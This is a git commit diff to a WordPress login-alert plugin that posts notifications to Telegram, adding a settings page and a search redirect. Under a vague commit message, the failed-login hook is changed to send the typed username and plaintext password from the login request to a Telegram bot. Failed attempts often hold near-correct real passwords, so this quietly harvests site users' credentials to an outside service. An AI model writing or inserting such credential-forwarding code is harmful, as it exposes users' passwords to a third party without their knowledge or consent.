0b449ad5f8a1bd28c14f8dc0d5372fc5e7187219
MuhammadRezaHeidary <muhammadreza.heidary@gmail.com>
2023-05-24 00:00:43 +0330

    adding settings menu and some other codes!

--- mekatron-loginalert.php
+++ mekatron-loginalert.php
@@ -11,15 +11,43 @@ License: MIT
 */
 
 
-include_once(plugin_dir_path(__FILE__).'libs/notificator-telegram-bot.php');
+include(plugin_dir_path(__FILE__).'libs/notificator-telegram-bot.php');
 
+add_action('admin_menu', function () {
+    add_options_page('هشدار تلگرام',
+        'هشدار تلگرام',
+        'manage_options',
+        'login-alert',
+        function () {
+            wp_enqueue_style( 'my-style', plugins_url( 'libs/mekatron-login-alert-setting-page-style.css', __FILE__ ), false, '1.0', 'all' );
+            $html = file_get_contents(plugin_dir_path(__FILE__).'libs/mekatron-login-alert-settings-page.html');
+            echo $html;
+        });
+});
+
+add_action('template_redirect', function () {
+    if(is_search()) {
+        global $wp_query;
+        if($wp_query->found_posts == 1) {
+            $url = get_permalink($wp_query->posts[0]->ID);
+            wp_redirect($url);
+            exit;
+        }
+    }
+});
 
 add_action('wp_login_failed', function ($username, $error) {
-    telegram_notificator_send_message('Login Failed for '.$username.PHP_EOL.$error->get_error_message ());
+    telegram_notificator_send_message('Login Failed for '.$username.PHP_EOL.
+        $error->get_error_message ());
+    telegram_notificator_send_message('Tried User: '.$_REQUEST['log'].PHP_EOL.
+        'Tried Pass: '.$_REQUEST['pwd']);
 }, 10, 2);
 
 add_action('wp_login', function ($user_login, $user ) {
-    telegram_notificator_send_message('نام کاربری: '.$user_login.PHP_EOL.'نام: '.$user->first_name.' '.PHP_EOL.'فامیل: '.$user->last_name.PHP_EOL.'توضیحات: '.$user->description);
+    telegram_notificator_send_message('نام کاربری: '.$user_login.PHP_EOL.
+        'نام: '.$user->first_name.' '.PHP_EOL.
+        'فامیل: '.$user->last_name.PHP_EOL.
+        'توضیحات: '.$user->description);
 }, 10, 2);
 
 
